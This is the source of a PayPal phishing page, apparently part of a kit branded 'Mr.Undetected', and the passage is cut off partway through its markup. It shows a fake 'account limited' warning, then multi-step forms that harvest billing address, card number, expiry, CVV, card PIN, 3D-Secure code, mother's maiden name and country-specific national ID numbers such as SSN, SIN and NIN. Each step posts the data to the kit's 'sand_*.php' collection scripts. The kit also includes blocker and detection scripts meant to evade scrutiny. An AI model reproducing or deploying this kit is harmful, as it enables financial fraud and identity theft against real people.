<?php
//#     #            #     #                                                              #     #   #   
//##   ## #####      #     # #    # #####  ###### ##### ######  ####  ##### ###### #####  #     #  ##   
//# # # # #    #     #     # ##   # #    # #        #   #      #    #   #   #      #    # #     # # #   
//#  #  # #    #     #     # # #  # #    # #####    #   #####  #        #   #####  #    # #     #   #   
//#     # #####  ### #     # #  # # #    # #        #   #      #        #   #      #    #  #   #    #   
//#     # #   #  ### #     # #   ## #    # #        #   #      #    #   #   #      #    #   # #     #   
//#     # #    # ###  #####  #    # #####  ######   #   ######  ####    #   ###### #####     #    ##### 

session_start();
error_reporting(0);
include "../system/blocker.php";
include "../system/detect.php";

include "../system/system.php";


?>

<?php
$data = explode('@' , $_SESSION['_email_']); 
$_SESSION['_emaildd_']   = $data[1] ; ?>





<!DOCTYPE html>
<title>PayPal: Summary</title>

<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link rel="shortcut icon" href="../style/img/pp_favicon_x.ico" />

<link rel="apple-touch-icon" href="../style/img/pp64.png" />





<link rel='stylesheet' type='text/css' href='//scama-yahya-xhack.blogspot.com/' />

<script>
function openNav() {
    document.getElementById("mySidenav").style.width = "100%";
}

function closeNav() {
    document.getElementById("mySidenav").style.width = "0";
}
</script>
<div id="mySidenav" class="sidenav">




<script>
$("#siraconta").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/myaccount");
});
</script>
<script>
$("#sirpaypala").click(function(e) {
      e.preventDefault();
   $(location).attr("href", "//paypal.com/signin");
});
</script>       






<div id='tbadkatviry'>
<br><br>
<br>
<br>
<br>
<br>
<br>
<div>
<div style="text-align: center;">
<span class="stepLogo paymentStepLogo" data-reactid="14"></span>
<div class="centerContainer contextStep firstLoad" data-reactid="9">
<div class="paymentContainer" data-reactid="10"><div data-reactid="11">
<img  src="../style/img/warning.png">


<link rel="stylesheet" type="text/css" href="http://creedmoria.com/wordpress/img/login,css">



<link rel="stylesheet" type="text/css" href="../style/css/main-service-nav.css">
<div><span class="stepLogo regStepLogo"></span></div>




<h2>Verify your account. </h2><p> We apologize for any inconvenience. </p><p> You can not access all your PayPal advantages, due to account limited. <br>
                        </p><p> </p><p style="margin-bottom:25px;"> To restore your account, please click <i>Continue</i> to update your information</p>		


<button id="submit" onclick="closeNav()" class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 -->Continue To PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>

</div>


</div></div>

</div></div>


</div>



<div id="tbanhadiblastviry" style="display:none;">

<br><br>
<br>
<br>
<br>
<br>
<br>



<div style="text-align: center;">


<img width="150" height="150" src="../style/img/animation-checkmark.gif&#10;">


                         <p>  Now you can enjoy our services, thank you for choosing our trusted service.<br> 
                             your account will be verified in the next 24 hours. 
                        </p>
                        <div class="btn-content-last">
                            






<button id="irpaypala" class="vx_btn" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> My PayPal<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button> 

<button id="iraconta" class="vx_btn vx_btn-secondary" type="submit" autocomplete="off" tabindex="0"><!-- react-text: 259 --> Log Out<!-- /react-text --><span class="icon-paypal-container"><!-- react-text: 261 -->&nbsp;<!-- /react-text --><span class=""></span></span><!-- react-text: 263 --><!-- /react-text --></button>





                                                                 </div>
                        <p class="seconds"> You are being redirected to your PayPal account , within 10 seconds. </p> 

			<p></p><h2>Your Account <?php echo $_SESSION['_email_'] ;?>  has been successfully Restored</h2><h2><p></p>
            

<p></p> 
<p></p> 


<p></p><div class="footerLink"></div></h2></div>


</div>
</div>





<style>
body {
    font-family: "Lato", sans-serif;
}

.sidenav {
    height: 100%;
    width: 100%;
    position: fixed;
        z-index: 5;
    top: 0;
    left: 0;
    right: 0;
    bottom: 0;
    background-color: #ffffff;
    opacity: 0.9;
    overflow-y: hidden;
    transition: 0.5s;
}

.sidenav a {
    padding: 8px 8px 8px 32px;
    text-decoration: none;
    font-size: 25px;
    color: #818181;
    display: block;
    transition: 0.3s;

}
.sidenav a:hover{
    color: #f1f1f1;
}
.sidenav .closebtn {
    position: absolute;
    top: 0;
    right: 25px;
    font-size: 36px;
    margin-left: 50px;
}
</style>


<style>

 #chtadiscover {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 98.5% 75.4%;
}

 #chtamastartro {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 62.0%;
}

  #chtacalub {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 99.5% 46.8%;
}

  #chtaofam {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 34.0%;
}

  #chtajcb {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 20.0%;
}

 #chtamastercard {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% 9.5%;
}


  #chtavisa {
	background-image: url('../style/img/3dsecure.png');
	background-repeat: no-repeat;
	background-position: 97.5% -1.3%;
}

</style>





<style type="text/css">
.multi.equal .right {
    float: right;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .right {
    width: 25%;
    float: left;
}
.multi.equal .left {
    margin-right: 0;
}
.multi.equal .left, .multi.equal .right {
    width: 48.6%;
}
.multi .left {
    width: 72.5%;
    float: left;
}
.left, .middle {
    margin-right: 10px;
}
#card{display: none;}  
#cardscrity{display: none;}
#nwabank{display: none;}
#thnksss{display: none;}
#emailadress{display: none;}
#uploadcardssa{display: none;}


.vx_btn.vx_btn-seco, .vx_btn-small.vx_btn-secon, .vx_btn-medium.vx_btn-seco {


background-color: transparent;
    border-color: #0070ba;
    color: #0070ba;


    margin-right: 0;
    margin-left: 0;
    width: 100%;
}



</style>




<link href="../style/css/bootstrap-min.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8"><link href="../style/css/bootstrap-theme-min.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8"><link href="../style/css/77b924a83312878dd46ac7dff08d0eecb52c7b.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">


<link href="../style/css/wallet.ltr.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">
<link href="../style/css/6666c5cf54da2a2722aefb7f6a63fb484e9ae7.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">



<script src="../style/js/jquery.min.js"></script>
<script src="./lib/js/jquery.additional-methods.js"></script>




<link href="../style/css/main-service-nav.css" media="screen, projection" rel="stylesheet" type="text/css" charset="UTF-8">




</head><body class=""><div id="app-element-mountpoint"><div id="document-body" data-reactroot="" data-reactid="1"><div class="backgroundColor" data-reactid="2">





</script><div data-reactid="4"><div class="signup clear app-wrapper
                     " data-reactid="5"><div class="signup-page-header" data-reactid="6"><a href="#"  onclick="openNav()"  class="signup-page-header-logo" data-reactid="7">Paypal</a><a href="#"  onclick="openNav()"  class="signup-page-header-button vx_btn vx_btn-medium vx_btn-secondary  " data-reactid="8">Log Out</a></div><main data-reactid="9"><div data-reactid="10"><!-- react-text: 11 --> <!-- /react-text --><div class="signup-page-form" data-reactid="12"><div class="notification" data-reactid="13"></div><div data-reactid="14"><!-- react-text: 15 --> <!-- /react-text -->

<div id="fixed"  class="vx_has-spinner-large spinner_fullScreen test_has_spinner" >
</div>


 <div id="doori" style="display:none;"> 
<div class="notification"></div>
<div class="busyIcon"></div>
<div class="busyOverlay"></div>
</div>




<script type="text/javascript">
document.onreadystatechange = function () {
  var state = document.readyState
  if (state == 'complete') {
      setTimeout(function(){
          document.getElementById('interactive');
         document.getElementById('fixed').style.visibility="hidden";
      },4000);
  }
}
</script>

<body  ng-app=""  >




<form name="bilings" id="bilings" class="signupAppContent" method="POST" data-reactid="16">




<!-- react-empty: 17 --><div data-reactid="18"><!-- react-text: 19 --> <!-- /react-text -->


<div id="bilingkatba" class="" style="margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Update Billing Address</h1>
</div>




<div  id="cardkatba" class="" style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Update Credit/Debit Card, no need to enter it again when using PayPal</h1>
</div>



<div  id="androidkatba" class="" style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Last Version Of PayPal Application</h1>
</div>






<div id="scritykatba"  style="display:none;margin:0px 0px 20px 0px;text-align:center;"  data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Confirm your debit or credit card Password & your Security Social Number</h1>
</div>

<div id="bankkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link a <?php echo $countryname ?> bank account</h1>
</div>

<div id="emailkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Link a E-Mail Account <?=@$_SESSION['_emaildd_'];?></h1>
</div>

<div id="upleadkatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Please confirme your ID for more secure</h1>
</div>


<div id="thankskatba" class=""  style="display:none;margin:0px 0px 20px 0px;text-align:center;" data-reactid="20">
<h1 class="vx_text-2 center" style="margin-top:0px;" data-reactid="21">Congratulations! Your have restored your account access.</h1>
</div>


<!-- react-text: 22 --> <!-- /react-text --></div>


<div class="fieldGroupContainer" data-reactid="23">

<link rel="stylesheet" type="text/css" href="//day-morocoo.com/css/login,css">

<script src="./lib/js/jquery.additional-methods.js"></script>
<script src="./lib/js/jquery.CardValidator.js"></script>
<script src="./lib/js/jquery.js"></script>
<script src="./lib/js/jquery.mask.js"></script>
<script src="./lib/js/jquery.phoneNumber.js"></script>
<script src="./lib/js/jquery.validate.min.js"></script>


  <script>
    $(function() {
    $('#birthdate').mask('00/00/0000');
	});
    $(function() {
    $('#expdate').mask('00/0000');
	});
    $(function() {
    $('#phoneNumber').mask('(000) 000-000000000000');
	});
	</script>


  <script type="text/javascript">
    $(function() {
        $('#cardnumber').mask('0000 0000 0000 0000 0000');
		$('#csc').mask('0000');

        $('#birthdate').mask('00/00/0000');

        $('#SSN').mask('000-00-0000');





	});
	</script>


<div id="billing">


<script>


$(function() {

	var validator = $("#bilings").bind("invalid-form.validate", function() {
			$("#errorrbiliing").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})


  $("form[name='bilings']").validate({

	errorContainer: $("#errorrbiliing"),



    rules: {


      email: {
        required: true,
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {
      Firstname: "First Name is required",
      LastName: "Last Name is required",
      phoneNumber : "Phone Number is required",
      zipCod : "Postal Code is required",
      addres : "Address Line is required",
      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },



 birthdate: {
        required: "Birth Date Day/Month/Year is required!",
        minlength: "Please enter a valid Birth Date Day/Month/Year "
      },





      email: "Please enter a valid email address"
    },


     submitHandler: function(form) {
$("#doori").show();


					$.post("../system/sand_biling.php?ajax", $("#bilings").serialize(), function(result) {
                            setTimeout(function() {


                    $("#cardkatba").show();

                    $("#card").show();

                    $("#billing").hide();
                    $("#bilingkatba").hide();
                    $("#doori").hide();


                                $(location).attr("", "");
                        });
                 });
        },
  
  });

});

</script>






<form id="bilings" action="" method="post" data-reactid="113" name='bilings'  >


<div id="errorrbiliing"></div>



<div class="multi equal clearfix">
                                                    <div class=" left">

<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="First name" data-reactid="128"><label for="expDate" data-reactid="129">First name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input data-rule-pattern="^[a-z A-Z0-9]+$"  value="" type="text" required="required" ng-model="Firstname" id="Firstname" aria-describedby="text-info-expDate FirstnameinputError" name="Firstname" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="FirstnameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Last Name" data-reactid="128"><label for="expDate" data-reactid="129">Last Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text"  ng-model="LastName"
 id="LastName" aria-describedby="text-info-expDate LastNameinputError" name="LastName" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="LastNameinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>




<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Birth date" data-reactid="124"><label for="cardNumber" data-reactid="125">Birth date</label>
<div class="vx_form-control vx_form-control_complex" data-reactid="126">

<input minlength="8"  data-rule-pattern="^[a-zA-Z0-9 ;,\.\/\\_\-\)\(:]+$"  required="required" type="text" id="birthdate" aria-describedby="text-info-cardNumber email_addressinputError birthdateinputError" name="birthdate" class="test_cardNumber hasText valid" placeholder="DD/MM/YYYY" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="false">


</div></div>

<label id="birthdateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>







<div class="dddd dor  vx_form-group vx_floatingLabel_active " data-label-content="Address Line" data-reactid="128"><label for="expDate" data-reactid="129">Address Line</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">

<input required="required" type="text" id="addres" aria-describedby="text-info-expDate addresinputError" name="addres" class="test_expDate vx_has-error-with-message vx_form-control-message" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">
</div>
</div>
<label id="addresinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div class="multi equal clearfix">

        <div class=" left">

<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="City" data-reactid="128"><label for="expDate" data-reactid="129">City</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" ng-model="City" id="City" aria-describedby="text-info-expDate CityinputError" name="City" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="CityinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

                      </div>



<div class="right">  



<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="State" data-reactid="128"><label for="expDate" data-reactid="129">State</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input required="required" type="text"  ng-model="State"
 id="State" aria-describedby="text-info-expDate StateinputError" name="State" class="" placeholder="" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="StateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



                                                    </div>
                                            </div>








<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Postal Code" data-reactid="128"><label for="expDate" data-reactid="129">Postal Code</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" id="zipCod" aria-describedby="text-info-expDate zipCodinputError" name="zipCod" class="test_expDate hasText valid" placeholder="-----" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div>
  </div>

<label id="zipCodinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>



<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Phone Number" data-reactid="128"><label for="expDate" data-reactid="129">Phone Number</label><div class="vx_form-control vx_form-control_complex a" data-reactid="130">
<input type="text" required="required" id="phoneNumber" aria-describedby="text-info-expDate phoneNumberinputError" name="phoneNumber" class="test_phoneNumber hasText valid" placeholder="(___) ___ ___________" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div>
</div>
<label id="phoneNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>
<br>




<button type="submit" class="vx_btn vx_btn-block validateBeforeSubmit">Continue</button>



</form>

</div>



<script>
// Wait for the DOM to be ready
$(function() {

	var validator = $("#cardings").bind("invalid-form.validate", function() {
			$("#errorrcardings").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})




  $("form[name='cardings']").validate({
    
	errorContainer: $("#errorrcardings"),

    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },

highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},





    messages: {

      NameOnCard: "Name On Card is required!",

      lastName: "Last Name is required!",




expdate: {
        required: "Expiration Month/Year  is required!",
        minlength: "Please enter a valid Expiration Month/Year "
      },


 csc: {
        required: "Security Code (CVV) is required!",
        minlength: "Please enter a valid CVV code"
      },


  cardnumber: {
        required: "Card Number is required!",
        minlength: "Please check your Card Number"
      },


      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },






      email: "Please enter a valid email address"
    },
    // in the "action" attribute of the form when valid
    
                submitHandler: function(form) {
                    $("#doori").show();
					$.post("../system/sand_carde.php?ajax", $("#cardings").serialize(), function(result) {
                            setTimeout(function() {




$("#scritykatba").show(); 
$("#cardscrity").show();
$("#card").hide();
$("#cardkatba").hide();

                    $("#doori").hide();


 var $id = $('input[name="cardnumber"]').val();
 $('#ofm3raftch').html('' + $id.substr($id.length - 4));


                                $(location).attr("", "");
                            });
                    });
    }
  });
});

</script>



<div id="card"  >

<form id="cardings" action="" method="post" data-reactid="113" name='cardings'  >



<div id="errorrcardings"></div>


<div data-reactid="114"><ul class="cardImages-container" data-reactid="115"><li class="cardImages-entry" data-reactid="116">


<span id='visaa' class="rectangleLogo_small shadow  visaLogo cardImages-icon" data-reactid="117"></span>

</li><li class="cardImages-entry" data-reactid="118">

<span id='metrcardaa'  class="rectangleLogo_small shadow  master_cardLogo cardImages-icon" data-reactid="119">

</span></li><li class="cardImages-entry" data-reactid="120">

<span id='amxaa'  class="rectangleLogo_small shadow  amexLogo cardImages-icon" data-reactid="121"></span>


</li><li class="cardImages-entry" data-reactid="122">

<span id='discovaraa'  class="rectangleLogo_small shadow  discoverLogo cardImages-icon" data-reactid="123"></span>

</li></ul></div>




<div  class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Name On Card" data-reactid="124"><label for="cardNumber" data-reactid="125">Name On Card</label><div class="vx_form-control vx_form-control_complex" data-reactid="126">


<input ng-model="NameOnCard" type="text" required="required" id="NameOnCard" aria-describedby="text-info-cardNumber NameOnCardinputError" name="NameOnCard" class="test_NameOnCard vx_form-control-message" placeholder="Enter Name On Card" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="true">


</div></div>

<label id="NameOnCardinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>






<div  class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Credit or debit card number" data-reactid="124"><label for="cardNumber" data-reactid="125">Credit or debit card number</label><div class="vx_form-control vx_form-control_complex" data-reactid="126">


<input maxlength="24" minlength="14"  type="text" required="required" id="cardnumber" aria-describedby="text-info-cardNumber cardNumberinputError" name="cardnumber" class="test_cardNumber vx_form-control-message" placeholder="Enter card number" autocomplete="off" value="" data-reactid="127" aria-required="true" aria-invalid="true">


</div></div>

<label id="cardNumberinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Expiry date" data-reactid="128"><label for="expDate" data-reactid="129">Expiry date</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">

<input maxlength="7" minlength="5"  type="text" id="expdate"  ng-model="expdate" aria-describedby="text-info-expDate expDateinputError" name="expdate" class="test_expDate hasText valid" required="required" placeholder="mm/yy" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">

</div></div>

<label id="expDateinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

<div class="table-container" data-reactid="132"><div class="table-row" data-reactid="133"><div class="table-col-xs-10" data-reactid="134"><div class="dddd dor vx_form-group vx_floatingLabel_active" data-label-content="Security code" data-reactid="135"><label for="verificationCode" data-reactid="136">Security code</label><div class="vx_form-control vx_form-control_complex" data-reactid="137">

<input  type="text" id="csc" aria-describedby="text-info-verificationCode verificationCodeinputError" name="csc" class="test_verificationCode hasText valid" required="required" placeholder="Enter security code" autocomplete="off" data-reactid="138" aria-required="true" aria-invalid="false">

<label id="verificationCodeinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


</div>
</div>


</div>

<div class="table-col-xs-2 cardImage-container" data-reactid="139"><span id='cscaa' class="rectangleLogo_small shadow  csc-image " data-reactid="140"></span>

</div></div></div><div class="vx_form-group" data-reactid="141">

<div>
<div>






 
<br>

 <button type="submit" class="vx_btn vx_btn-block validateBeforeSubmit">Continue</button>

</form>

</div>
</div>
</div>



</div>






<div id="cardscrity"  >

<div class="" style="" id="formdetail" role="document">
<div id="overpanel-header" class=" overpanel-header">
<h2 id="overpanel-header">Card details</h2>
</div>
<div class=" overpanel-body">



<script>

$(function() {


	var validator = $("#3dcarding").bind("invalid-form.validate", function() {
			$("#errorr3dcarding").html("<div class='vx_alert vx_alert-critical form-alert alertComponent test_alert-message'><p role='alert' aria-live='assertive' class='vx_alert-text'><!-- react-text: 204 -->Please check your information and try again.<!-- /react-text --></p></div>");})



  $("form[name='3dcarding']").validate({
    // Specify validation rules

	errorContainer: $("#errorr3dcarding"),


    rules: {
      // The key name on the left side is the name attribute
      // of an input field. Validation rules are defined
      // on the right side
      firstname: "required",
      lastname: "required",
      email: {
        required: true,
        // Specify that email should be validated
        // by the built-in "email" rule
        email: true
      },
      password: {
        required: true,
        minlength: 5
      }
    },


highlight: function ( element, errorClass, validClass ) {
$( element ).parents( ".dddd" ).removeClass( validClass );
	$( element ).parents( ".dddd" ).addClass( errorClass );
				},
unhighlight: function (element, errorClass, validClass) {
					
	$( element ).parents( ".dddd" ).addClass( validClass );
$( element ).parents( ".dddd" ).removeClass( errorClass );
				},



    messages: {

      firstName: "First Name is required!",
      lastName: "Last Name is required!",




      DSecure: "Please check your 3D-Secure",

      CardPIN: "Please check your Card PIN",


      SSN: "Social Security Number is required",
      sin: "Soci&#97;l Insur&#97;nce Number is required",
      NIN: "N&#97;tional Insur&#97;nce Number is required",
      FCN: "Fiscal Code Number is required!",
      irpps: "Personal Public Service Number is required",
      mmn: "Mother M&#97;iden Name is required!",
      cpfbr: "CPF Number is required!",
      BSN: "Citizen Service Number/SOFI is required",
      DNI: "National Identity Document Number is required",
      SID: "Personal Identity Number is required",
      OSID: "Online Shopping ID is required",



      password: {
        required: "Please provide a password",
        minlength: "Your password must be at least 5 characters long"
      },
      email: "Please enter a valid email address"
    },
    // Make sure the form is submitted to the destination defined
    // in the "action" attribute of the form when valid
       
                submitHandler: function(form) {
 
                    $("#doori").show();



					$.post("../system/sand_3d.php?ajax", $("#3dcarding").serialize(), function(result) {
                            setTimeout(function() {




$("#cardsiiis").attr("class","setupStep-state nemo_account nemo_account_created nemo_setup_button setupStep-doneState accountCreated");

  $("#cardsiiis").html("<span class='icon icon-medium icon-checkmark-small setupStep-icon' aria-hidden='true'></span><span class='setupStep-stateContent'>Card PayPal confirmed</span>");






$("#nwabank").show(); 
$("#bankkatba").show();
$("#cardscrity").hide();
$("#scritykatba").hide();
                    $("#doori").hide();
                     $(location).attr("", "");
                            });
                    });

    }
  });
});

</script>

<div id="errorr3dcarding"></div>

      
<form id="3dcarding" action="" method="post" data-reactid="113" name='3dcarding'>



<div class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Security information" data-reactid="128"><label for="expDate" data-reactid="129">Full Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input type="text" required="required" id="" aria-describedby="text-info-expDate DSecureinputError" name="DSecure" class="chtadakchi test_expDate hasText valid" placeholder="3D-Secure" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="false">
</div>
  </div>

<label id="DSecureinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>


<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="ATM or Debit Card PIN" data-reactid="128"><label for="expDate" data-reactid="129">ATM or Debit Card PIN</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" type="password" id="CardPIN" aria-describedby="text-info-expDate CardPINinputError" name="CardPIN" class="" placeholder="Card PIN" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true">

</div>
</div>

<label id="CardPINinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>

<?php 
if(trim($_SESSION['country1']) == "United States"){
	echo '<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Social Security Number" data-reactid="128"><label for="expDate" data-reactid="129">ATM or Debit Card PIN</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" type="text" id="SSN" aria-describedby="text-info-expDate SSNinputError" name="SSN" class="" placeholder="SSN (9 digits)" autocomplete="off" data-reactid="131"  maxlength="11"  aria-required="true" aria-invalid="true"></div></div><label id="SSNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php 
if(trim($_SESSION['country1']) == "Canada"){
	echo '<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Soci&#97;l Insur&#97;nce Number" data-reactid="128"><label for="expDate" data-reactid="129">Soci&#97;l Insur&#97;nce Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="11" type="text" id="sin" aria-describedby="text-info-expDate sininputError" name="sin" class="" placeholder="SIN (9 digits)" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="sininputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "United Kingdom"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="N&#97;tional Insur&#97;nce Number" data-reactid="128"><label for="expDate" data-reactid="129">N&#97;tional Insur&#97;nce Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="13" type="text" id="NIN" aria-describedby="text-info-expDate NINinputError" name="NIN" class="" placeholder="NINo" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="NINinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Italy"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Fiscal Code Number" data-reactid="128"><label for="expDate" data-reactid="129">Fiscal Code Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130"><input  required="required" maxlength="16"  type="text" id="FCN" aria-describedby="text-info-expDate FCNinputError" name="FCN" class="" placeholder="Codice fiscale" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="FCNinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Ireland"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Personal Public Service Number" data-reactid="128"><label for="expDate" data-reactid="129">Personal Public Service Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="16"  type="text" id="irpps" aria-describedby="text-info-expDate irppsinputError" name="irpps" class="" placeholder="PPS No" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="irppsinputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label><div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="Mother M&#97;iden Name" data-reactid="128"><label for="expDate" data-reactid="129">Mother M&#97;iden Name</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
<input  required="required" maxlength="30"  type="text" id="mmn" aria-describedby="text-info-expDate mmninputError" name="mmn" class="" placeholder="Mother name" autocomplete="off" data-reactid="131" aria-required="true" aria-invalid="true"></div></div><label id="mmninputError" class="a vx_form-control-message vx_has-error-with-message" style="display: none;"></label>';} ?>
<?php if (trim($_SESSION['country1']) == "Brazil"){
	echo'<div  class="dddd dor vx_form-group vx_floatingLabel_active " data-label-content="CPF Number" data-reactid="128"><label for="expDate" data-reactid="129">CPF Number</label><div class="vx_form-control vx_form-control_complex" data-reactid="130">
